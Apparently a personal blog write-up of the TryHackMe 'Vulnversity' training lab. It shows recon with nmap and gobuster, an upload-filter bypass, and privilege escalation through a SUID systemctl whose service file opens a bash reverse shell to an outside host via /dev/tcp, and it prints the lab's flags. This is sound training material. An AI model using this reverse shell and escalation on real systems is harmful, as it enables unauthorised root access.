<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>TryHackMe -Vulversity | twseptian’s website</title>
<meta name="description" content="Learn about active recon, web app attacks and privilege escalation.">


  <meta name="author" content="twseptian">
  
  <meta property="article:author" content="twseptian">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="twseptian's website">
<meta property="og:title" content="TryHackMe -Vulversity">
<meta property="og:url" content="http://localhost:4000/tryhackme/thm-vulversity/">


  <meta property="og:description" content="Learn about active recon, web app attacks and privilege escalation.">



  <meta property="og:image" content="http://localhost:4000/assets/images/avatar_backup.png">



  <meta name="twitter:site" content="@twseptian_">
  <meta name="twitter:title" content="TryHackMe -Vulversity">
  <meta name="twitter:description" content="Learn about active recon, web app attacks and privilege escalation.">
  <meta name="twitter:url" content="http://localhost:4000/tryhackme/thm-vulversity/">

  
    <meta name="twitter:card" content="summary">
    
      <meta name="twitter:image" content="http://localhost:4000/assets/images/avatar_backup.png">
    
  

  



  <meta property="article:published_time" content="2020-06-02T00:00:00+07:00">



  <meta property="article:modified_time" content="2020-06-02T14:58:26+07:00">



  

  


<link rel="canonical" href="http://localhost:4000/tryhackme/thm-vulversity/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "my notes, journey and random stuff",
      "url": "http://localhost:4000/",
      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
    
  }
</script>


  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />


  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">




<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="twseptian's website Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->




    <!-- start custom head snippets -->
<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
<!-- insert favicons. use https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
        
        <a class="site-title" href="/">
          twseptian's website
          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/">posts</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/">tags</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/">categories</a>
            </li><li class="masthead__menu-item">
              <a href="/projects/">projects</a>
            </li><li class="masthead__menu-item">
              <a href="/research/">research</a>
            </li><li class="masthead__menu-item">
              <a href="/about/">about me</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>

    
    <aside class="sidebar__top">
      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
      </aside>

    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/avatar_backup.png" alt="twseptian" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">twseptian</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Perpetual Learner</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia (ID)</span>
        </li>
      

      
        
          
            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>




  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="TryHackMe -Vulversity">
    <meta itemprop="description" content="  Learn about active recon, web app attacks and privilege escalation.">
    <meta itemprop="datePublished" content="2020-06-02T00:00:00+07:00">
    <meta itemprop="dateModified" content="2020-06-02T14:58:26+07:00">

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">TryHackMe -Vulversity
</h1>
          
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2020-06-02T00:00:00+07:00">June 2, 2020</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          6 minute read
        
      </span>
        
  </p>
  



          <section class="page__share">
  
    <!--<h4 class="page__share-title">Share on</h4>-->
  

  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=TryHackMe+-Vulversity%20http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-vulversity%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-vulversity%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-vulversity%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
  
  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
</section>

          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu">
  <li><a href="#task-2---reconnaissance-need-an-answer">Task 2 - Reconnaissance, need an answer</a>
    <ul>
      <li><a href="#2-scan-the-box-how-many-ports-are-open">#2. Scan the box, how many ports are open?</a></li>
      <li><a href="#3-what-version-of-the-squid-proxy-is-running-on-the-machine">#3. What version of the squid proxy is running on the machine?</a></li>
      <li><a href="#4-how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used">#4. How many ports will nmap scan if the flag -p-400 was used?</a></li>
      <li><a href="#5-using-the-nmap-flag--n-what-will-it-not-resolve">#5. Using the nmap flag -n what will it not resolve?</a></li>
      <li><a href="#6-what-is-the-most-likely-operating-system-this-machine-is-running">#6. What is the most likely operating system this machine is running?</a></li>
      <li><a href="#7-what-port-is-the-web-server-running-on">#7. What port is the web server running on?</a></li>
    </ul>
  </li>
  <li><a href="#task-3---locating-directories-using-gobuster">Task 3 - Locating directories using GoBuster</a>
    <ul>
      <li><a href="#2-what-is-the-directory-that-has-an-upload-form-page">#2. What is the directory that has an upload form page?</a></li>
    </ul>
  </li>
  <li><a href="#task-4---compromise-the-webserver">Task 4 - Compromise the webserver</a>
    <ul>
      <li><a href="#1-try-upload-a-few-file-types-to-the-server-what-common-extension-seems-to-be-blocked">#1. Try upload a few file types to the server, what common extension seems to be blocked?</a></li>
      <li><a href="#3-were-going-to-use-intruder-used-for-automating-customised-attacks">#3. We’re going to use Intruder (used for automating customised attacks).</a></li>
      <li><a href="#5-what-user-was-running-the-web-server">#5. What user was running the web server?</a></li>
      <li><a href="#6-what-is-the-user-flag">#6. What is the user flag?</a></li>
    </ul>
  </li>
  <li><a href="#task-5---privilege-escalation">Task 5 - Privilege Escalation</a>
    <ul>
      <li><a href="#1-in-linux-suid-set-owner-userid-upon-execution-is-a-special-type-of-file-permission-given-to-a-file-suid-gives-temporary-permissions-to-a-user-to-run-the-programfile-with-the-permission-of-the-file-owner-rather-than-the-user-who-runs-it">#1. In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</a></li>
      <li><a href="#2-its-challenge-time-we-have-guided-you-through-this-far-are-you-able-to-exploit-this-system-further-to-escalate-your-privileges-and-get-the-final-answer">#2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?</a></li>
    </ul>
  </li>
  <li><a href="#reference">Reference:</a></li>
</ul>

            </nav>
          </aside>
        
        <blockquote>
  <p>Learn about active recon, web app attacks and privilege escalation.</p>
</blockquote>

<h3 id="task-2---reconnaissance-need-an-answer">Task 2 - Reconnaissance, need an answer</h3>

<h4 id="2-scan-the-box-how-many-ports-are-open">#2. Scan the box, how many ports are open?</h4>

<p>in this case, we tried to use nmap for grabing network information</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╰─$ sudo nmap -sV 10.10.201.124
[sudo] password for twseptian: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 09:47 WIB
Nmap scan report for 10.10.201.124
Host is up (0.40s latency).                                                   
Not shown: 994 closed ports                                                   
PORT     STATE SERVICE     VERSION                                            
21/tcp   open  ftp         vsftpd 3.0.3                                       
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)                                                                     
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)        
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)        
3128/tcp open  http-proxy  Squid http proxy 3.5.12                            
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))                     
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                        
                                                                              
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                              
Nmap done: 1 IP address (1 host up) scanned in 56.63 seconds   
</code></pre></div></div>
<p>ANS: <code class="language-plaintext highlighter-rouge">6</code></p>

<h4 id="3-what-version-of-the-squid-proxy-is-running-on-the-machine">#3. What version of the squid proxy is running on the machine?</h4>
<p>ANS: <code class="language-plaintext highlighter-rouge">3.5.12</code></p>

<h4 id="4-how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used">#4. How many ports will nmap scan if the flag -p-400 was used?</h4>
<p>the nmap of scanning</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ sudo nmap -sV -p-400 10.10.201.124                                  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 09:50 WIB
Nmap scan report for 10.10.201.124
Host is up (0.27s latency).
Not shown: 397 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.31 seconds
</code></pre></div></div>
<p>ANS: <code class="language-plaintext highlighter-rouge">400</code></p>

<h4 id="5-using-the-nmap-flag--n-what-will-it-not-resolve">#5. Using the nmap flag -n what will it not resolve?</h4>

<p>Hint</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IP to hostname
</code></pre></div></div>
<p>nmap scanning result</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ nmap -n 10.10.201.124
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 09:57 WIB
Nmap scan report for 10.10.201.124
Host is up (0.23s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
</code></pre></div></div>
<p>ANS: <code class="language-plaintext highlighter-rouge">DNS</code></p>

<h4 id="6-what-is-the-most-likely-operating-system-this-machine-is-running">#6. What is the most likely operating system this machine is running?</h4>

<p>Hint</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Run nmap with the -O flag
</code></pre></div></div>
<p>ANS: <code class="language-plaintext highlighter-rouge">Ubuntu</code></p>

<h4 id="7-what-port-is-the-web-server-running-on">#7. What port is the web server running on?</h4>

<p>ANS: <code class="language-plaintext highlighter-rouge">3333</code></p>

<h3 id="task-3---locating-directories-using-gobuster">Task 3 - Locating directories using GoBuster</h3>
<h4 id="2-what-is-the-directory-that-has-an-upload-form-page">#2. What is the directory that has an upload form page?</h4>

<p>use gobuster for web directory fuzzing</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ gobuster dir -u http://10.10.201.124:3333 -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.201.124:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/02 10:04:01 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2020/06/02 10:06:14 Finished
===============================================================
</code></pre></div></div>
<p>ANS: <code class="language-plaintext highlighter-rouge">/internal/</code></p>

<h3 id="task-4---compromise-the-webserver">Task 4 - Compromise the webserver</h3>
<h4 id="1-try-upload-a-few-file-types-to-the-server-what-common-extension-seems-to-be-blocked">#1. Try upload a few file types to the server, what common extension seems to be blocked?</h4>

<p>ANS: <code class="language-plaintext highlighter-rouge">.php</code></p>

<h4 id="3-were-going-to-use-intruder-used-for-automating-customised-attacks">#3. We’re going to use Intruder (used for automating customised attacks).</h4>
<p>To begin, make a wordlist with the following extensions in:</p>

<p><img src="/assets/images/thm-vulversity/01.png" alt="filelist" /></p>

<p>Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on “Payloads” and select the “Sniper” attack type.
Click the “Positions” tab now, find the filename and “Add §” to the extension. It should look like so:</p>

<p><img src="/assets/images/thm-vulversity/02.png" alt="02" /></p>

<p>Run this attack, what extension is allowed?</p>

<p>ANS: <code class="language-plaintext highlighter-rouge">.phtml</code></p>

<h4 id="5-what-user-was-running-the-web-server">#5. What user was running the web server?</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ nc -lvnp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.201.124.
Ncat: Connection from 10.10.201.124:35578.
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 23:36:38 up 42 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false
bill:x:1000:1000:,,,:/home/bill:/bin/bash
</code></pre></div></div>
<p>go to <code class="language-plaintext highlighter-rouge">/home/bill</code> and find <code class="language-plaintext highlighter-rouge">user.txt</code></p>

<p>ANS: <code class="language-plaintext highlighter-rouge">bill</code></p>

<h4 id="6-what-is-the-user-flag">#6. What is the user flag?</h4>

<p>Hint</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The contents of the file /home/bill/user.txt
</code></pre></div></div>

<p>ANS:<code class="language-plaintext highlighter-rouge">8bd7992fbe8a6ad22a63361004cfcedb</code></p>

<h3 id="task-5---privilege-escalation">Task 5 - Privilege Escalation</h3>
<h4 id="1-in-linux-suid-set-owner-userid-upon-execution-is-a-special-type-of-file-permission-given-to-a-file-suid-gives-temporary-permissions-to-a-user-to-run-the-programfile-with-the-permission-of-the-file-owner-rather-than-the-user-who-runs-it">#1. In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</h4>

<p>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.</p>

<p><img src="/assets/images/thm-vulversity/03.jpg" alt="03" /></p>

<p>On the system, search for all SUID files. What file stands out?</p>

<p>Hint</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Use the command: find / -user root -perm -4000 -exec ls -ldb {} \;
</code></pre></div></div>

<p>ANS: <code class="language-plaintext highlighter-rouge">/bin/systemctl</code></p>

<h4 id="2-its-challenge-time-we-have-guided-you-through-this-far-are-you-able-to-exploit-this-system-further-to-escalate-your-privileges-and-get-the-final-answer">#2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?</h4>

<p>Become root and get the last flag (/root/root.txt)</p>

<p>hint</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/systemctl
</code></pre></div></div>

<p>create root.service</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Unit]
Description=access root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.9.19.3/9999 0&gt;&amp;1'

[Install]
WantedBy=multi-user.target
</code></pre></div></div>
<p>and enable root.service using systemctl</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ /bin/systemctl enable /tmp/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /tmp/root.service.
Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
$ /bin/systemctl start root
</code></pre></div></div>
<p>create reverse connection in a new terminal and go to root directory</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ nc -lvp 9999                
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.201.124.
Ncat: Connection from 10.10.201.124:36448.
bash: cannot set terminal process group (20501): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# ls -la
ls -la
total 96
drwxr-xr-x  23 root root  4096 Jul 31  2019 .
drwxr-xr-x  23 root root  4096 Jul 31  2019 ..
drwxr-xr-x   2 root root  4096 Jul 31  2019 bin
drwxr-xr-x   3 root root  4096 Jul 31  2019 boot
drwxr-xr-x  17 root root  3700 Jun  1 22:54 dev
drwxr-xr-x  98 root root  4096 Aug  1  2019 etc
drwxr-xr-x   3 root root  4096 Jul 31  2019 home
lrwxrwxrwx   1 root root    33 Jul 31  2019 initrd.img -&gt; boot/initrd.img-4.4.0-142-generic
drwxr-xr-x  22 root root  4096 Jul 31  2019 lib
drwxr-xr-x   2 root root  4096 Jul 31  2019 lib64
drwx------   2 root root 16384 Jul 31  2019 lost+found
drwxr-xr-x   3 root root  4096 Jul 31  2019 media
drwxr-xr-x   2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x   2 root root  4096 Feb 26  2019 opt
dr-xr-xr-x 138 root root     0 Jun  1 22:54 proc
drwx------   4 root root  4096 Jul 31  2019 root
drwxr-xr-x  28 root root   980 Jun  1 22:54 run
drwxr-xr-x   2 root root 12288 Jul 31  2019 sbin
drwxr-xr-x   2 root root  4096 Jul 31  2019 snap
drwxr-xr-x   3 root root  4096 Jul 31  2019 srv
dr-xr-xr-x  13 root root     0 Jun  1 22:54 sys
drwxrwxrwt   9 root root  4096 Jun  2 00:17 tmp
drwxr-xr-x  10 root root  4096 Jul 31  2019 usr
drwxr-xr-x  14 root root  4096 Jul 31  2019 var
lrwxrwxrwx   1 root root    30 Jul 31  2019 vmlinuz -&gt; boot/vmlinuz-4.4.0-142-generic
root@vulnuniversity:/# cd /root
cd /root
root@vulnuniversity:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Jul 31  2019 .
drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
lrwxrwxrwx  1 root root    9 Jul 31  2019 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 31  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 31  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Jul 31  2019 root.txt
root@vulnuniversity:~# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
root@vulnuniversity:~# 
</code></pre></div></div>

<p>ANS: <code class="language-plaintext highlighter-rouge">a58ff8579f0a9270368d33a9966c7fd5</code></p>

<h3 id="reference">Reference:</h3>
<ul>
  <li>https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49</li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
  
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">TryHackMe</a>
    
    </span>
  </p>


        
  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-02">June 2, 2020</time></p>


      </footer>
      
      
  <nav class="pagination">
    
      <a href="/hackthebox%20machine/htb-machine-blunder/" class="pagination--pager" title="HackTheBox Machine - Blunder
">Previous</a>
    
    
      <a href="/tryhackme/thm-ignite/" class="pagination--pager" title="TryHackMe - Ignite
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          3 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Pendahuluan
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
